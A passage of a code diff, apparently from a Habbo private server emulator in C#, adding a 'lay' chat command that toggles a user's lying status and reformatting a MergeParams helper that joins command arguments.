+                            }
+                            if (!TargetRoomUser.Statusses.ContainsKey("lay"))
+                            {
+                                if (TargetRoomUser.RotBody % 2 == 0)
+                                {
+                                    TargetRoomUser.Statusses.Add("lay", Convert.ToString((double)Session.GetHabbo().CurrentRoom.SqFloorHeight[TargetRoomUser.X, TargetRoomUser.Y] + 0.55));
+                                    TargetRoomUser.UpdateNeeded = true;
+                                }
+                                else
+                                {
+                                    Session.GetHabbo().Sendselfwhisper("You cant lay if you are diagonal!");
+                                }
+                            }
+                            else
+                            {
+                                TargetRoomUser.Statusses.Remove("lay");
+                                TargetRoomUser.UpdateNeeded = true;
+                            }
+                            return true;
+                        #endregion
+                    }
+                }
+                catch
+                {
+                }
+                return false;
+            }
+        }
 
-						}
-				    }
-				}					
-					IL_3F91:;
-			    }
-				catch
-				{
-				}
-				return false;
-			}
-		}
-		public static string MergeParams(string[] Params, int Start)
-		{
-			StringBuilder MergedParams = new StringBuilder();
-			for (int i = 0; i < Params.Length; i++)
-			{
-				if (i >= Start)
-				{
-					if (i > Start)
-					{
-						MergedParams.Append(" ");
-					}
-					MergedParams.Append(Params[i]);
-				}
-			}
-			return MergedParams.ToString();
-		}
-	}
+
+        public static string MergeParams(string[] Params, int Start)
+        {
+            StringBuilder MergedParams = new StringBuilder();
+            for (int i = 0; i < Params.Length; i++)
+            {
+                if (i >= Start)
+                {
+                    if (i > Start)
+                    {
+                        MergedParams.Append(" ");
+                    }
+                    MergedParams.Append(Params[i]);
+                }
+            }
+            return MergedParams.ToString();
+        }
+    }
 }
